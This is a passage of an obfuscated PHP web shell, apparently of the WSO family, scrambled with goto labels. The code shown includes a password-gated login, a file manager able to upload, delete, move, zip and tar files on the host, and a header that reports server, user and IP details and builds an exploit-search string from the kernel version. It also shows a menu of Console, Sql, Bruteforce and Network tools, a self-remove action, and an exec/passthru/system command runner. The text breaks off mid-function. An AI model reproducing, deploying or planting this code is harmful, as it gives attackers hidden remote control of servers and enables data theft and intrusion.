                    goto A7140;
                }
                goto e4e11;
                Adc78:
                goto B0aa4;
                goto A98b4;
                e326a:
            }
            goto a1dc4;
            D224e:
            ob_start("ob_gzhandler", 4096);
            goto c49dd;
            Ced9c:
            if (function_exists("mime_content_type")) {
                $type = @mime_content_type($_POST['p1']);
                header("Content-Type: " . $type);
            } else {
                header("Content-Type: application/octet-stream");
            }
            goto f3e4c;
            a1dc4:
        }
        exit;
    }
    goto F3dce;
    a20a1:
}
goto d7e5a;
fe916:
function yUoJQViewSize($s)
{
    if (is_int($s)) {
        $s = sprintf("%u", $s);
    }
    if ($s >= 1073741824) {
        return sprintf('%1.2f', $s / 1073741824) . ' GB';
    } elseif ($s >= 1048576) {
        return sprintf('%1.2f', $s / 1048576) . ' MB';
    } elseif ($s >= 1024) {
        return sprintf('%1.2f', $s / 1024) . ' KB';
    } else {
        return $s . ' B';
    }
}
goto A8de0;
B415c:
if (!empty($auth_pass)) {
    if (isset($_POST['pass']) && md5($_POST['pass']) == $auth_pass) {
        yUoJQsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
    }
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || $_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass) {
        yUoJQLogin();
    }
}
goto Be367;
Fd6f4:
function yUoJQWhich($p)
{
    goto E559b;
    B6a0b:
    if (!empty($path)) {
        return $path;
    }
    goto b02f0;
    b02f0:
    return false;
    goto A6d8e;
    E559b:
    $path = yUoJQEx('which ' . $p);
    goto B6a0b;
    A6d8e:
}
goto a8067;
Bc1e0:
function actionFilesMan()
{
    goto F8e59;
    d19a8:
    Dfef9:
    goto e3d2a;
    B9d28:
    if (!empty($_POST['p1'])) {
        if (preg_match('!s_([A-z]+)_(\\d{1})!', $_POST['p1'], $match)) {
            $sort = array($match[1], (int) $match[2]);
        }
    }
    goto cc7f3;
    E2f74:
    echo "<input type='submit' value='>>'></td></tr></form></table></div>";
    goto f28dd;
    e68fc:
    echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
    goto B4317;
    F66d1:
    A79c6:
    goto C1a2a;
    e3d2a:
    $i++;
    goto fe128;
    Fbc35:
    usort($dirs, "yUoJQCmp");
    goto de267;
    b94ab:
    if (!empty($_COOKIE['act']) && @count($_COOKIE['f'])) {
        echo "<option value='paste'>Paste / Compress</option>";
    }
    goto d35d0;
    de267:
    $files = array_merge($dirs, $files);
    goto fdbb4;
    Ecfce:
    $tmp = array('name' => $dirContent[$i], 'path' => $GLOBALS['cwd'] . $dirContent[$i], 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' => yUoJQPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' => @filesize($GLOBALS['cwd'] . $dirContent[$i]), 'owner' => $ow['name'] ? $ow['name'] : @fileowner($dirContent[$i]), 'group' => $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]));
    goto e4366;
    fdbb4:
    $l = 0;
    goto Fdd6c;
    eea1c:
    echo "<tr><td colspan=7>\r\n\t<input type=hidden name=a value='FilesMan'>\r\n\t<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'>\r\n\t<input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>\r\n\t<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
    goto C7fad;
    eede3:
    if (!($i < $n)) {
        goto A79c6;
    }
    goto Ce50a;
    Fdd6c:
    foreach ($files as $f) {
        goto b6fc5;
        b6fc5:
        echo '<tr' . ($l ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td><td><a href=# onclick="' . ($f['type'] == 'file' ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');" ' . (empty($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a></td><td>' . ($f['type'] == 'file' ? yUoJQViewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms'] . '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')">T</a>' . ($f['type'] == 'file' ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>';
        goto f67ce;
        B4559:
        bd235:
        goto fb169;
        f67ce:
        $l = $l ? 0 : 1;
        goto B4559;
        fb169:
    }
    goto d08fa;
    b01e6:
    $n = count($dirContent);
    goto c47dd;
    cdecf:
    usort($files, "yUoJQCmp");
    goto Fbc35;
    d35d0:
    echo "</select>&nbsp;";
    goto e5b34;
    Ce50a:
    $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
    goto Bd3f3;
    b75e4:
    yUoJQHeader();
    goto e68fc;
    C1a2a:
    $GLOBALS['sort'] = $sort;
    goto e0b2d;
    cc7f3:
    echo "<script>\r\n\tfunction sa() {\r\n\t\tfor(i=0;i<d.files.elements.length;i++)\r\n\t\t\tif(d.files.elements[i].type == 'checkbox')\r\n\t\t\t\td.files.elements[i].checked = d.files.elements[0].checked;\r\n\t}\r\n</script>\r\n<table width='100%' class='main' cellspacing='0' cellpadding='2'>\r\n<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($sort[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($sort[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($sort[1] ? 0 : 1) . "\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($sort[1] ? 0 : 1) . "\")'>Permissions</a></th><th>Actions</th></tr>";
    goto a6394;
    Fefa2:
    if (!empty($_POST['p1'])) {
        goto d35e0;
        cbaae:
        e8b5f:
        goto A99c1;
        Aa2a3:
        Db0c3:
        goto cbaae;
        d35e0:
        switch ($_POST['p1']) {
            case 'uploadFile':
                if (!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) {
                    echo "Can't upload file!";
                }
                goto e8b5f;
            case 'mkdir':
                if (!@mkdir($_POST['p2'])) {
                    echo "Can't create new dir";
                }
                goto e8b5f;
            case 'delete':
                goto C2af4;
                e4492:
                if (is_array(@$_POST['f'])) {
                    foreach ($_POST['f'] as $f) {
                        goto d8be9;
                        E2f89:
                        $f = urldecode($f);
                        goto e3249;
                        e3249:
                        if (is_dir($f)) {
                            deleteDir($f);
                        } else {
                            @unlink($f);
                        }
                        goto Eac4a;
                        Eac4a:
                        Fdde3:
                        goto fe68f;
                        d8be9:
                        if ($f == '..') {
                            goto Fdde3;
                        }
                        goto E2f89;
                        fe68f:
                    }
                    dfe9a:
                }
                goto cc6bd;
                C2af4:
                function deleteDir($path)
                {
                    goto B6225;
                    F8279:
                    if (basename($item) == ".." || basename($item) == ".") {
                        goto E5150;
                    }
                    goto ed5bc;
                    A2e0e:
                    if ($type == "dir") {
                        deleteDir($item);
                    } else {
                        @unlink($item);
                    }
                    goto Cd74f;
                    B175d:
                    F8fc8:
                    goto aa6e2;
                    ed5bc:
                    $type = filetype($item);
                    goto A2e0e;
                    F6250:
                    $dh = opendir($path);
                    goto B9821;
                    B6225:
                    $path = substr($path, -1) == '/' ? $path : $path . '/';
                    goto F6250;
                    dc53d:
                    $item = $path . $item;
                    goto F8279;
                    a8e48:
                    @rmdir($path);
                    goto a9269;
                    Cd74f:
                    goto E5150;
                    goto B175d;
                    aa6e2:
                    closedir($dh);
                    goto a8e48;
                    a184f:
                    if (!(($item = readdir($dh)) !== false)) {
                        goto F8fc8;
                    }
                    goto dc53d;
                    B9821:
                    E5150:
                    goto a184f;
                    a9269:
                }
                goto e4492;
                cc6bd:
                goto e8b5f;
                goto c0a95;
                c0a95:
            case 'paste':
                goto c86ed;
                Ee61a:
                setcookie('f', '', time() - 3600);
                goto f0a7d;
                b0918:
                unset($_COOKIE['f']);
                goto Ee61a;
                f0a7d:
                goto e8b5f;
                goto C90e5;
                c86ed:
                if ($_COOKIE['act'] == 'copy') {
                    goto B790c;
                    F40e1:
                    b28d4:
                    goto Ab54e;
                    Cc75f:
                    foreach ($_COOKIE['f'] as $f) {
                        copy_paste($_COOKIE['c'], $f, $GLOBALS['cwd']);
                        b21e5:
                    }
                    goto F40e1;
                    B790c:
                    function copy_paste($c, $s, $d)
                    {
                        if (is_dir($c . $s)) {
                            goto Ce22c;
                            f5612:
                            if ($f != "." and $f != "..") {
                                copy_paste($c . $s . '/', $f, $d . $s . '/');
                            }
                            goto ff10e;
                            e7c8c:
                            F5e19:
                            goto fa034;
                            e8186:
                            $h = @opendir($c . $s);
                            goto e7c8c;
                            ff10e:
                            goto F5e19;
                            goto b752e;
                            Ce22c:
                            mkdir($d . $s);
                            goto e8186;
                            fa034:
                            if (!(($f = @readdir($h)) !== false)) {
                                goto dc49b;
                            }
                            goto f5612;
                            b752e:
                            dc49b:
                            goto ea153;
                            ea153:
                        } elseif (is_file($c . $s)) {
                            @copy($c . $s, $d . $s);
                        }
                    }
                    goto Cc75f;
                    Ab54e:
                } elseif ($_COOKIE['act'] == 'move') {
                    goto ae93e;
                    b5e58:
                    foreach ($_COOKIE['f'] as $f) {
                        @rename($_COOKIE['c'] . $f, $GLOBALS['cwd'] . $f);
                        A23c8:
                    }
                    goto D6af2;
                    ae93e:
                    function move_paste($c, $s, $d)
                    {
                        if (is_dir($c . $s)) {
                            goto Bc099;
                            Bc099:
                            mkdir($d . $s);
                            goto cfa03;
                            cfa03:
                            $h = @opendir($c . $s);
                            goto c3507;
                            a2860:
                            if (!(($f = @readdir($h)) !== false)) {
                                goto D2e21;
                            }
                            goto b7d80;
                            Cce90:
                            goto F9ae5;
                            goto B5312;
                            B5312:
                            D2e21:
                            goto d5a4d;
                            b7d80:
                            if ($f != "." and $f != "..") {
                                copy_paste($c . $s . '/', $f, $d . $s . '/');
                            }
                            goto Cce90;
                            c3507:
                            F9ae5:
                            goto a2860;
                            d5a4d:
                        } elseif (@is_file($c . $s)) {
                            @copy($c . $s, $d . $s);
                        }
                    }
                    goto b5e58;
                    D6af2:
                    a01cb:
                    goto D2884;
                    D2884:
                } elseif ($_COOKIE['act'] == 'zip') {
                    if (class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($_POST['p2'], 1)) {
                            goto a29e0;
                            a29e0:
                            chdir($_COOKIE['c']);
                            goto d5770;
                            F5c16:
                            E71ba:
                            goto E4f7c;
                            E4f7c:
                            chdir($GLOBALS['cwd']);
                            goto cbc79;
                            d5770:
                            foreach ($_COOKIE['f'] as $f) {
                                goto bce76;
                                bce76:
                                if ($f == '..') {
                                    goto E9bad;
                                }
                                goto d2b0a;
                                be133:
                                E9bad:
                                goto Fe6b1;
                                d2b0a:
                                if (@is_file($_COOKIE['c'] . $f)) {
                                    $zip->addFile($_COOKIE['c'] . $f, $f);
                                } elseif (@is_dir($_COOKIE['c'] . $f)) {
                                    goto beb94;
                                    A611d:
                                    ebb1e:
                                    goto aaf36;
                                    beb94:
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . '/', FilesystemIterator::SKIP_DOTS));
                                    goto d9f2f;
                                    d9f2f:
                                    foreach ($iterator as $key => $value) {
                                        $zip->addFile(realpath($key), $key);
                                        f5803:
                                    }
                                    goto A611d;
                                    aaf36:
                                }
                                goto be133;
                                Fe6b1:
                            }
                            goto F5c16;
                            cbc79:
                            $zip->close();
                            goto Ccfc6;
                            Ccfc6:
                        }
                    }
                } elseif ($_COOKIE['act'] == 'unzip') {
                    if (class_exists('ZipArchive')) {
                        goto b36ad;
                        bb5ca:
                        Ef4e6:
                        goto e26e9;
                        feb0e:
                        foreach ($_COOKIE['f'] as $f) {
                            if ($zip->open($_COOKIE['c'] . $f)) {
                                $zip->extractTo($GLOBALS['cwd']);
                                $zip->close();
                            }
                            Dcbb8:
                        }
                        goto bb5ca;
                        b36ad:
                        $zip = new ZipArchive();
                        goto feb0e;
                        e26e9:
                    }
                } elseif ($_COOKIE['act'] == 'tar') {
                    goto Bbe9b;
                    Fdb0c:
                    yUoJQEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                    goto E85b8;
                    E85b8:
                    chdir($GLOBALS['cwd']);
                    goto c2d6f;
                    Bbe9b:
                    chdir($_COOKIE['c']);
                    goto af81b;
                    af81b:
                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
                    goto Fdb0c;
                    c2d6f:
                }
                goto b0918;
                C90e5:
            default:
                if (!empty($_POST['p1'])) {
                    goto f4f75;
                    ece21:
                    yUoJQsetcookie('f', serialize(@$_POST['f']));
                    goto a1e97;
                    a1e97:
                    yUoJQsetcookie('c', @$_POST['c']);
                    goto f53e3;
                    f4f75:
                    yUoJQsetcookie('act', $_POST['p1']);
                    goto ece21;
                    f53e3:
                }
                goto e8b5f;
        }
        goto Aa2a3;
        A99c1:
    }
    goto b75e4;
    a6394:
    $dirs = $files = array();
    goto b01e6;
    Bd3f3:
    $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
    goto Ecfce;
    e3fee:
    $sort = array('name', 1);
    goto B9d28;
    e0b2d:
    function yUoJQCmp($a, $b)
    {
        if ($GLOBALS['sort'][0] != 'size') {
            return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]])) * ($GLOBALS['sort'][1] ? 1 : -1);
        } else {
            return ($a['size'] < $b['size'] ? -1 : 1) * ($GLOBALS['sort'][1] ? 1 : -1);
        }
    }
    goto cdecf;
    fe128:
    goto c5ff3;
    goto F66d1;
    e4366:
    if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) {
        $files[] = array_merge($tmp, array('type' => 'file'));
    } elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) {
        $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
    } elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i])) {
        $dirs[] = array_merge($tmp, array('type' => 'dir'));
    }
    goto d19a8;
    c47dd:
    $i = 0;
    goto aa10e;
    e5b34:
    if (!empty($_COOKIE['act']) && @count($_COOKIE['f']) && ($_COOKIE['act'] == 'zip' || $_COOKIE['act'] == 'tar')) {
        echo "file name: <input type=text name=p2 value='yUoJQ_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip' ? 'zip' : 'tar.gz') . "'>&nbsp;";
    }
    goto E2f74;
    Dc8b3:
    global $sort;
    goto e3fee;
    d08fa:
    c7112:
    goto eea1c;
    aa10e:
    c5ff3:
    goto eede3;
    bd6fb:
    if ($dirContent === false) {
        goto Bfe98;
        Be3d7:
        yUoJQFooter();
        goto d9b2e;
        d9b2e:
        return;
        goto C7ce4;
        Bfe98:
        echo 'Can\'t open this folder!';
        goto Be3d7;
        C7ce4:
    }
    goto Dc8b3;
    C7fad:
    if (class_exists('ZipArchive')) {
        echo "<option value='zip'>Compress (zip)</option><option value='unzip' selected>Uncompress (unzip)</option>";
    }
    goto Deb14;
    f28dd:
    yUoJQFooter();
    goto bff42;
    F8e59:
    if (!empty($_COOKIE['f'])) {
        $_COOKIE['f'] = @unserialize($_COOKIE['f']);
    }
    goto Fefa2;
    Deb14:
    echo "<option value='tar'>Compress (tar.gz)</option>";
    goto b94ab;
    B4317:
    $dirContent = yUoJQScandir(isset($_POST['c']) ? $_POST['c'] : $GLOBALS['cwd']);
    goto bd6fb;
    bff42:
}
goto D828d;
def8d:
if (!$safe_mode) {
    error_reporting(0);
}
goto E05ee;
d77a6:
function actionSelfRemove()
{
    goto D8218;
    C973f:
    echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
    goto C005f;
    D8218:
    if ($_POST['p1'] == 'yes') {
        if (@unlink(preg_replace('!\\(\\d+\\)\\s.*!', '', __FILE__))) {
            die('Shell has been removed');
        } else {
            echo 'unlink error!';
        }
    }
    goto c0efc;
    c0efc:
    if ($_POST['p1'] != 'yes') {
        yUoJQHeader();
    }
    goto C973f;
    C005f:
    yUoJQFooter();
    goto dc131;
    dc131:
}
goto aa930;
C2065:
$cwd = @getcwd();
goto E4721;
e7b61:
$default_use_ajax = true;
goto Cb4b5;
Ee88b:
if ($cwd[strlen($cwd) - 1] != '/') {
    $cwd .= '/';
}
goto Dec26;
c27d1:
function yUoJQLogin()
{
    die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
}
goto b91b5;
A8de0:
function yUoJQPerms($p)
{
    goto Ded9b;
    a7c78:
    $i .= $p & 0x20 ? 'r' : '-';
    goto e23d5;
    e677e:
    $i .= $p & 0x8 ? $p & 0x400 ? 's' : 'x' : ($p & 0x400 ? 'S' : '-');
    goto d1025;
    D55b2:
    $i .= $p & 0x1 ? $p & 0x200 ? 't' : 'x' : ($p & 0x200 ? 'T' : '-');
    goto e59de;
    C4127:
    $i .= $p & 0x100 ? 'r' : '-';
    goto c89b6;
    c89b6:
    $i .= $p & 0x80 ? 'w' : '-';
    goto fed33;
    Ded9b:
    if (($p & 0xc000) == 0xc000) {
        $i = 's';
    } elseif (($p & 0xa000) == 0xa000) {
        $i = 'l';
    } elseif (($p & 0x8000) == 0x8000) {
        $i = '-';
    } elseif (($p & 0x6000) == 0x6000) {
        $i = 'b';
    } elseif (($p & 0x4000) == 0x4000) {
        $i = 'd';
    } elseif (($p & 0x2000) == 0x2000) {
        $i = 'c';
    } elseif (($p & 0x1000) == 0x1000) {
        $i = 'p';
    } else {
        $i = 'u';
    }
    goto C4127;
    e23d5:
    $i .= $p & 0x10 ? 'w' : '-';
    goto e677e;
    d1025:
    $i .= $p & 0x4 ? 'r' : '-';
    goto Dba27;
    fed33:
    $i .= $p & 0x40 ? $p & 0x800 ? 's' : 'x' : ($p & 0x800 ? 'S' : '-');
    goto a7c78;
    e59de:
    return $i;
    goto A92de;
    Dba27:
    $i .= $p & 0x2 ? 'w' : '-';
    goto D55b2;
    A92de:
}
goto d791a;
D650f:
function yUoJQHeader()
{
    goto D9e5b;
    F531a:
    if (!empty($GLOBALS['auth_pass'])) {
        $m['Logout'] = 'Logout';
    }
    goto D89aa;
    B43f0:
    goto C71a7;
    goto c740f;
    A4ddb:
    $freeSpace = @diskfreespace($GLOBALS['cwd']);
    goto e5aed;
    d5692:
    $i++;
    goto D640e;
    A3709:
    $cwd_links = '';
    goto Ae7d2;
    fc9dd:
    $cwd_links .= $path[$j] . '/';
    goto f9ca1;
    c2598:
    $i = 0;
    goto E13bf;
    D04fe:
    A6ec6:
    goto E898a;
    E13bf:
    bbb9b:
    goto cab08;
    c1895:
    da80d:
    goto Ccf82;
    e613f:
    $kernel = @php_uname('s');
    goto d0c95;
    f51f2:
    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win' ? '<br>Drives:' : '') . '</span></td>' . '<td><nobr>' . substr(@php_uname(), 0, 120) . '</nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode'] ? '<font color=red>ON</font>' : '<font color=green><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . yUoJQViewSize($totalSpace) . ' <span>Free:</span> ' . yUoJQViewSize($freeSpace) . ' (' . (int) ($freeSpace / $totalSpace * 100) . '%)<br>' . $cwd_links . ' ' . yUoJQPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>' . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>' . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
    goto df11e;
    d6886:
    if (strpos('Linux', $kernel) !== false) {
        $explink .= urlencode('Linux Kernel ' . substr($release, 0, 6));
    } else {
        $explink .= urlencode($kernel . ' ' . substr($release, 0, 3));
    }
    goto B2767;
    Ddaf7:
    $j++;
    goto B43f0;
    cab08:
    if (!($i < $n - 1)) {
        goto A6ec6;
    }
    goto a88e9;
    de442:
    ae610:
    goto B5f59;
    f693d:
    $n = count($path);
    goto c2598;
    e5aed:
    $totalSpace = @disk_total_space($GLOBALS['cwd']);
    goto B3dfe;
    d0c95:
    $explink = '';
    goto d6886;
    f243d:
    C71a7:
    goto e699b;
    bbb82:
    global $color;
    goto C41e8;
    E898a:
    $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
    goto a4e0a;
    B5f59:
    $drives = "";
    goto Dc66f;
    D2357:
    Af9a9:
    goto d5692;
    a4e0a:
    $opt_charsets = '';
    goto Cebcc;
    f9ca1:
    A8994:
    goto Ddaf7;
    e699b:
    if (!($j <= $i)) {
        goto Dd5ca;
    }
    goto fc9dd;
    D89aa:
    $m['Self remove'] = 'SelfRemove';
    goto C5044;
    B3dfe:
    $totalSpace = $totalSpace ? $totalSpace : 1;
    goto d8bfc;
    d8bfc:
    $release = @php_uname('r');
    goto e613f;
    c740f:
    Dd5ca:
    goto d99ec;
    D640e:
    goto bbb9b;
    goto D04fe;
    Ccf82:
    $m = array('Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Console' => 'Console', 'Sql' => 'Sql', 'Php' => 'Php', 'String tools' => 'StringTools', 'Bruteforce' => 'Bruteforce', 'Network' => 'Network');
    goto F531a;
    d99ec:
    $cwd_links .= "\")'>" . $path[$i] . "/</a>";
    goto D2357;
    Ae7d2:
    $path = explode("/", $GLOBALS['cwd']);
    goto f693d;
    D9e5b:
    if (empty($_POST['charset'])) {
        $_POST['charset'] = $GLOBALS['default_charset'];
    }
    goto bbb82;
    A0064:
    $j = 0;
    goto f243d;
    a88e9:
    $cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
    goto A0064;
    B2767:
    if (!function_exists('posix_getegid')) {
        goto D7b04;
        eb8fe:
        $group = "?";
        goto C3fd8;
        f43e8:
        $gid = @getmygid();
        goto eb8fe;
        bf619:
        $uid = @getmyuid();
        goto f43e8;
        D7b04:
        $user = @get_current_user();
        goto bf619;
        C3fd8:
    } else {
        goto d1b37;
        f67a5:
        $gid = $gid['gid'];
        goto be201;
        B2158:
        $gid = @posix_getgrgid(posix_getegid());
        goto Ddc2b;
        db467:
        $group = $gid['name'];
        goto f67a5;
        d1b37:
        $uid = @posix_getpwuid(posix_geteuid());
        goto B2158;
        Ddc2b:
        $user = $uid['name'];
        goto Abf9a;
        Abf9a:
        $uid = $uid['uid'];
        goto db467;
        be201:
    }
    goto A3709;
    Dc66f:
    if ($GLOBALS['os'] == 'win') {
        foreach (range('c', 'z') as $drive) {
            if (is_dir($drive . ':\\')) {
                $drives .= '<a href="#" onclick="g(\'FilesMan\',\'' . $drive . ':/\')">[ ' . $drive . ' ]</a> ';
            }
            a5743:
        }
        Ddcff:
    }
    goto f51f2;
    Cebcc:
    foreach ($charsets as $item) {
        $opt_charsets .= '<option value="' . $item . '" ' . ($_POST['charset'] == $item ? 'selected' : '') . '>' . $item . '</option>';
        fea08:
    }
    goto c1895;
    C5044:
    $menu = '';
    goto a7087;
    a7087:
    foreach ($m as $k => $v) {
        $menu .= '<th width="' . (int) (100 / count($m)) . '%">[ <a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\')">' . $k . '</a> ]</th>';
        Aa6b1:
    }
    goto de442;
    C41e8:
    echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . "</title>\r\n<style>\r\nbody{background-color:#444;color:#e1e1e1;}\r\nbody,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }\r\ntable.info{ color:#fff;background-color:#222; }\r\nspan,h1,a{ color: {$color} !important; }\r\nspan{ font-weight: bolder; }\r\nh1{ border-left:5px solid {$color};padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }\r\ndiv.content{ padding: 5px;margin-left:5px;background-color:#333; }\r\na{ text-decoration:none; }\r\na:hover{ text-decoration:underline; }\r\n.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }\r\n.bigarea{ width:100%;height:300px; }\r\ninput,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid {$color}; font: 9pt Monospace,'Courier New'; }\r\nform{ margin:0px; }\r\n#toolsTbl{ text-align:center; }\r\n.toolsInp{ width: 300px }\r\n.main th{text-align:left;background-color:#5e5e5e;}\r\n.main tr:hover{background-color:#5e5e5e}\r\n.l1{background-color:#444}\r\n.l2{background-color:#333}\r\npre{font-family:Courier,Monospace;}\r\n</style>\r\n<script>\r\n    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';\r\n    var a_ = '" . htmlspecialchars(@$_POST['a']) . "'\r\n    var charset_ = '" . htmlspecialchars(@$_POST['charset']) . "';\r\n    var p1_ = '" . (strpos(@$_POST['p1'], "\n") !== false ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . "';\r\n    var p2_ = '" . (strpos(@$_POST['p2'], "\n") !== false ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . "';\r\n    var p3_ = '" . (strpos(@$_POST['p3'], "\n") !== false ? '' : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . "';\r\n    var d = document;\r\n\tfunction set(a,c,p1,p2,p3,charset) {\r\n\t\tif(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;\r\n\t\tif(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;\r\n\t\tif(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;\r\n\t\tif(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;\r\n\t\tif(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;\r\n\t\tif(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;\r\n\t\t//if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;\r\n\t}\r\n\tfunction g(a,c,p1,p2,p3,charset) {\r\n\t\tset(a,c,p1,p2,p3,charset);\r\n\t\td.mf.submit();\r\n\t}\r\n\tfunction a(a,c,p1,p2,p3,charset) {\r\n\t\tset(a,c,p1,p2,p3,charset);\r\n\t\tvar params = 'ajax=true';\r\n\t\tfor(i=0;i<d.mf.elements.length;i++)\r\n\t\t\tparams += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);\r\n\t\tsr('" . addslashes($_SERVER['REQUEST_URI']) . "', params);\r\n\t}\r\n\tfunction sr(url, params) {\r\n\t\tif (window.XMLHttpRequest)\r\n\t\t\treq = new XMLHttpRequest();\r\n\t\telse if (window.ActiveXObject)\r\n\t\t\treq = new ActiveXObject('Microsoft.XMLHTTP');\r\n        if (req) {\r\n            req.onreadystatechange = processReqChange;\r\n            req.open('POST', url, true);\r\n            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');\r\n            req.send(params);\r\n        }\r\n\t}\r\n\tfunction processReqChange() {\r\n\t\tif( (req.readyState == 4) )\r\n\t\t\tif(req.status == 200) {\r\n\t\t\t\tvar reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');\r\n\t\t\t\tvar arr=reg.exec(req.responseText);\r\n\t\t\t\teval(arr[2].substr(0, arr[1]));\r\n\t\t\t} else alert('Request error!');\r\n\t}\r\n</script>\r\n<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>\r\n<form method=post name=mf style='display:none;'>\r\n<input type=hidden name=a>\r\n<input type=hidden name=c>\r\n<input type=hidden name=p1>\r\n<input type=hidden name=p2>\r\n<input type=hidden name=p3>\r\n<input type=hidden name=charset>\r\n</form>";
    goto A4ddb;
    df11e:
}
goto b7878;
e6f70:
function yUoJQEx($in)
{
    goto ab04b;
    efa73:
    return $out;
    goto cd70f;
    f8b6b:
    if (function_exists('exec')) {
        @exec($in, $out);
        $out = @join("\n", $out);
    } elseif (function_exists('passthru')) {
        goto Eaeb8;
        Eaeb8:
        ob_start();
        goto Cb4dc;
        Cb4dc:
        @passthru($in);
        goto b0576;
        b0576:
        $out = ob_get_clean();
        goto A09e4;
        A09e4:
    } elseif (function_exists('system')) {
        goto A2386;
        c8ec9:
        @system($in);
        goto e9414;
        A2386:
        ob_start();
        goto c8ec9;
        e9414:
        $out = ob_get_clean();
        goto C4c1c;
        C4c1c:
